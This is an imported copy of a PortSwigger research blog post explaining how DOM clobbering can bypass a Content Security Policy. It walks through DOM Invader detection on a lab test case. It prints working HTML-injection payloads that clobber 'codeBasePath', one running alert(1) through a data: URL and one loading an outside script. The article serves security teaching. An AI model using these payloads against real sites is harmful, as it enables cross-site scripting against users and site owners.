---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-06-05_bypassing-csp-via-dom-clobbering.md
original_filename: 2023-06-05_bypassing-csp-via-dom-clobbering.md
title: Bypassing CSP via DOM clobbering
category: documents
detected_topics:
- xss
- ssrf
- csrf
- sqli
- command-injection
- path-traversal
tags:
- imported
- documents
- xss
- ssrf
- csrf
- sqli
- command-injection
- path-traversal
language: en
raw_sha256: b94196c1f983afe1186e97e9d164907e6ffde8a3513b8d849295e48fa6ad021a
text_sha256: cbdbffe534680eef253a2093192625cdb176562a2f064bd93f9709593dd17b8b
ingested_at: '2026-06-28T07:32:21Z'
sensitivity: unknown
redactions_applied: false
---

# Bypassing CSP via DOM clobbering

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-06-05_bypassing-csp-via-dom-clobbering.md
- Source Type: markdown
- Detected Topics: xss, ssrf, csrf, sqli, command-injection, path-traversal
- Ingested At: 2026-06-28T07:32:21Z
- Redactions Applied: False
- Raw SHA256: `b94196c1f983afe1186e97e9d164907e6ffde8a3513b8d849295e48fa6ad021a`
- Text SHA256: `cbdbffe534680eef253a2093192625cdb176562a2f064bd93f9709593dd17b8b`


## Content

---
title: "Bypassing CSP via DOM clobbering"
page_title: "Bypassing CSP via DOM clobbering | PortSwigger Research"
url: "https://portswigger.net/research/bypassing-csp-via-dom-clobbering"
final_url: "https://portswigger.net/research/bypassing-csp-via-dom-clobbering"
authors: ["Gareth Heyes (@garethheyes)"]
bugs: ["DOM Clobbering", "CSP bypass"]
publication_date: "2023-06-05"
added_date: "2023-06-05"
source: "pentester.land/writeups.json"
original_index: 1085
---

[](/)

[Login](/users)

Products Solutions [Research](/research) [Academy](/web-security) Support Company

[Customers](/customers) [About](/about) [Blog](/blog) [Careers](/careers) [Legal](/legal) [Contact](/contact) [Resellers](/support/reseller-faqs)

[My account](/users/youraccount) [Customers](/customers) [About](/about) [Blog](/blog) [Careers](/careers) [Legal](/legal) [Contact](/contact) [Resellers](/support/reseller-faqs)

[ ![Burp Suite DAST](/content/images/svg/icons/enterprise.svg) **Burp Suite DAST** The enterprise-enabled dynamic web vulnerability scanner. ](/burp/enterprise) [ ![Burp Suite Professional](/content/images/svg/icons/professional.svg) **Burp Suite Professional** The world's #1 web penetration testing toolkit. ](/burp/pro) [ ![Burp Suite Community Edition](/content/images/svg/icons/community.svg) **Burp Suite Community Edition** The best manual tools to start web security testing. ](/burp/communitydownload) [View all product editions](/burp)

[ **Burp Scanner** Burp Suite's web vulnerability scanner ![Burp Suite's web vulnerability scanner'](/mega-nav/images/burp-suite-scanner.jpg) ](/burp/vulnerability-scanner)

[ **Attack surface visibility** Improve security posture, prioritize manual testing, free up time. ](/solutions/attack-surface-visibility) [ **CI-driven scanning** More proactive security - find and fix vulnerabilities earlier. ](/solutions/ci-driven-scanning) [ **Application security testing** See how our software enables the world to secure the web. ](/solutions) [ **DevSecOps** Catch critical bugs; ship more secure software, more quickly. ](/solutions/devsecops) [ **Penetration testing** Accelerate penetration testing - find more bugs, more quickly. ](/solutions/penetration-testing) [ **Automated scanning** Scale dynamic scanning. Reduce risk. Save time/money. ](/solutions/automated-security-testing) [ **Bug bounty hunting** Level up your hacking and earn more bug bounties. ](/solutions/bug-bounty-hunting) [ **Compliance** Enhance security monitoring to comply with confidence. ](/solutions/compliance)

[View all solutions](/solutions)

[ **Product comparison** What's the difference between Pro and DAST? ![Burp Suite Professional vs Burp Suite DAST](/mega-nav/images/burp-suite.jpg) ](/burp/dast/resources/dast-vs-professional)

[ **Support Center** Get help and advice from our experts on all things Burp. ](/support) [ **Documentation** Tutorials and guides for Burp Suite. ](/burp/documentation) [ **Get Started - Professional** Get started with Burp Suite Professional. ](/burp/documentation/desktop/getting-started) [ **Get Started - DAST** Get started with Burp Suite DAST. ](/burp/documentation/dast/getting-started) [ **Downloads** Download the latest version of Burp Suite. ](/burp/releases)

[Visit the Support Center](/support)

[ **Downloads** Download the latest version of Burp Suite. ![The latest version of Burp Suite software for download](/mega-nav/images/latest-burp-suite-software-download.jpg) ](/burp/releases)

Articles

  * [Overview](/research)
  * Core Topics

[Black Hat](/research/black-hat) [XSS](/research/cross-site-scripting-research) [Request Smuggling](/research/request-smuggling) [Template Injection](/research/template-injection) [Top 10 Hacking Techniques](/research/top-10-web-hacking-techniques)

  * [Articles](/research/articles)
  * Meet the Researchers

[James Kettle](/research/james-kettle) [Gareth Heyes](/research/gareth-heyes) [Zakhar Fedotkin](/research/zakhar-fedotkin)

  * [Talks](/research/talks)
  * [ RSS  ](/research/rss)

# Bypassing CSP via DOM clobbering

  * [ ](https://twitter.com/share?url=https%3A%2F%2Fportswigger.net%2Fresearch%2Fbypassing-csp-via-dom-clobbering&text=Bypassing+CSP+via+DOM+clobbering%20-%20%40PortSwiggerRes%0A)
  * [ ](https://api.whatsapp.com/send?text=https%3A%2F%2Fportswigger.net%2Fresearch%2Fbypassing-csp-via-dom-clobbering)
  * [ ](https://reddit.com/submit?url=https%3A%2F%2Fportswigger.net%2Fresearch%2Fbypassing-csp-via-dom-clobbering)
  * [ ](https://www.linkedin.com/sharing/share-offsite?url=https%3A%2F%2Fportswigger.net%2Fresearch%2Fbypassing-csp-via-dom-clobbering)
  * [ ](mailto:?subject=Bypassing+CSP+via+DOM+clobbering&body=Bypassing+CSP+via+DOM+clobbering%0A%0AYou+might+have+found+HTML+injection%2C+but+unfortunately+identified+that+the+site+is+protected+with+CSP.+All+is+not+lost%2C+it+might+be+possible+to+bypass+CSP+using+DOM+clobbering%2C+which+you+can+now+detec%0A%0Ahttps://portswigger.net/research/bypassing-csp-via-dom-clobbering)
  * [ ](/research/rss)

![Gareth Heyes](/content/images/profiles/callout_gareth_heyes_114px.png)

### [Gareth Heyes](/research/gareth-heyes)

Researcher

[@garethheyes](https://twitter.com/garethheyes)

  * **Published:** Monday, 5 June 2023 at 14:00 UTC

  * **Updated:** Monday, 5 June 2023 at 14:00 UTC

  * 

![An image with two fists punching some text with XSS](/cms/images/8a/73/b9a7-article-clobbering_variables_article.png)  

You might have found HTML injection, but unfortunately identified that the site is protected with [CSP](/web-security/cross-site-scripting/content-security-policy). All is not lost, it might be possible to bypass CSP using [DOM clobbering](/web-security/dom-based/dom-clobbering), which you can now detect using DOM Invader! In this post we'll show you how.

We've based the test case on a bug bounty site, so you're likely to encounter similar code in the wild. If you're unfamiliar with [DOM clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering) then head over to our Academy to learn about this attack class and solve the labs.

## What you need for the exploit

To exploit DOM clobbering you need three things:

1\. HTML injection  
2\. A gadget - a property name or multiple property names  
3\. A sink

To bypass CSP, your gadget needs to end up in a sink that is allowed by the policy. This could be an `eval` function. More realistically, it could be a script that is protected by a nonce and a [strict-dynamic](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src#strict-dynamic) source expression in the CSP. When using `strict-dynamic` the script protected by a nonce is allowed to generate other scripts. We can take advantage of that to introduce our own scripts.

## Identifying a DOM clobbering vulnerability

First we need to load our test case in Burp browser. To access the test case, visit the following link: [DOM clobbering test case protected by CSP](https://portswigger-labs.net/dom-invader/testcases/augmented-dom-script-dom-clobbering-csp/).

Then we need to [enable DOM Invader](https://portswigger.net/burp/documentation/desktop/tools/dom-invader/enabling):

![A screenshot showing the test case being loaded with DOM Invader enabled](/cms/images/97/91/96d9-article-dom-invader-load-testcase.png)

Once DOM Invader is enabled, we need to [enable DOM clobbering detection](https://portswigger.net/burp/documentation/desktop/tools/dom-invader/dom-clobbering). You'll notice that DOM Invader shows a warning message, as DOM clobbering attacks may cause the site to break. We therefore recommend that you only enable DOM clobbering when you want to test a specific page.

![A screenshot showing DOM clobbering being enabled](/cms/images/43/b2/403c-article-dom-invader-dom-clobbering-enabling.png)

Then we need to reload the test case. If everything goes well you'll see that DOM Invader has found one sink named `script.src`. You'll notice that the sink value contains a string `domclobbering`, followed by two property names and a canary. This is the method DOM invader uses to find DOM clobbering vulnerabilities because multiple sinks and values could contain a clobbered property.

![A screenshot showing the DOM clobbering attack ending up in a sink](/cms/images/29/d8/f489-article-dom-invader-sink.png)

## Bypassing CSP to exploit the vulnerability

We've found a vulnerability and now we need to construct a DOM clobbering attack. Remember we also need HTML injection. Thankfully our test case [has such a hole](https://portswigger-labs.net/dom-invader/testcases/augmented-dom-script-dom-clobbering-csp/?x=MY%20HTML%20HERE).

We can try injecting a script. Notice that CSP prevents execution. Then we can use the information that DOM Invader has reported to construct an attack that attempts to bypass the CSP. Using the sink value in the above screenshot it looks like we need the properties `ehy` and `codeBasePath`. Notice that the sink value also contains a path `/utils.js` to a JavaScript file. We'll need to account for this in our exploit with a single line comment.

We now need to craft an exploit. If you need to refresh your memory on how to do this, visit the learning materials on our [Academy](https://portswigger.net/web-security/dom-based/dom-clobbering). We know the gadget ends up in a `script.src` attribute. If we click the stack trace and view the console we'll see the exact line where the sink occurs. Creating the exploit involves injecting two anchor tags that clobbers those properties:

`<a id=ehy><a id=ehy name=codeBasePath href=data:,alert(1)//>`

[View the solution](https://portswigger-labs.net/dom-invader/testcases/augmented-dom-script-dom-clobbering-csp/?x=%3Ca%20id=ehy%3E%3Ca%20id=ehy%20name=codeBasePath%20href=data:,alert\(1\)//%3E)

In the example we use a data URL, it's worth noting that this is not required it just was more elegant. You can use HTTP URLs instead and this will work perfectly fine. Notice I use a question mark instead of a single line comment to move the utils filename to the query string.

`<a id=ehy><a id=ehy name=codeBasePath href="//subdomain1.portswigger-labs.net/xss/xss.js?">`

[HTTP example](https://portswigger-labs.net/dom-invader/testcases/augmented-dom-script-dom-clobbering-csp/?x=%3Ca%20id=ehy%3E%3Ca%20id=ehy%20name=codeBasePath%20href=//subdomain1.portswigger-labs.net/xss/xss.js?%3E)

[ DOM Clobbering ](/research/dom-clobbering) [ DOM ](/research/dom) [ XSS ](/research/cross-site-scripting-research) [ csp ](/research/csp)

[Back to all articles](/research/articles)

## Related Research

### [ Cookie Chaos: How to bypass __Host and __Secure cookie prefixes 03 September 2025 Cookie Chaos: How to bypass __Host and __Secure cookie prefixes ](/research/cookie-chaos-how-to-bypass-host-and-secure-cookie-prefixes) ### [ Stealing HttpOnly cookies with the cookie sandwich technique 22 January 2025 Stealing HttpOnly cookies with the cookie sandwich technique ](/research/stealing-httponly-cookies-with-the-cookie-sandwich-technique) ### [ Bypassing WAFs with the phantom $Version cookie  04 December 2024 Bypassing WAFs with the phantom $Version cookie  ](/research/bypassing-wafs-with-the-phantom-version-cookie) ### [ Concealing payloads in URL credentials 23 October 2024 Concealing payloads in URL credentials ](/research/concealing-payloads-in-url-credentials)

Burp Suite

[Web vulnerability scanner](/burp/vulnerability-scanner) [Burp Suite Editions](/burp) [Release Notes](/burp/releases)

Vulnerabilities

[Cross-site scripting (XSS)](/web-security/cross-site-scripting) [SQL injection](/web-security/sql-injection) [Cross-site request forgery](/web-security/csrf) [XML external entity injection](/web-security/xxe) [Directory traversal](/web-security/file-path-traversal) [Server-side request forgery](/web-security/ssrf)

Customers

[Organizations](/organizations) [Testers](/testers) [Developers](/developers)

Company

[About](/about) [Careers](/careers) [Contact](/about/contact) [Legal](/legal) [Privacy Notice](/privacy) [Modern Slavery Statement](/modern-slavery-statement)

Insights

[Web Security Academy](/web-security) [Blog](/blog) [Research](/research) [Engineering](/engineering)

[![PortSwigger Logo](/content/images/logos/portswigger-logo.svg)](/) [ Follow us](https://twitter.com/Burp_Suite)

© 2026 PortSwigger Ltd.
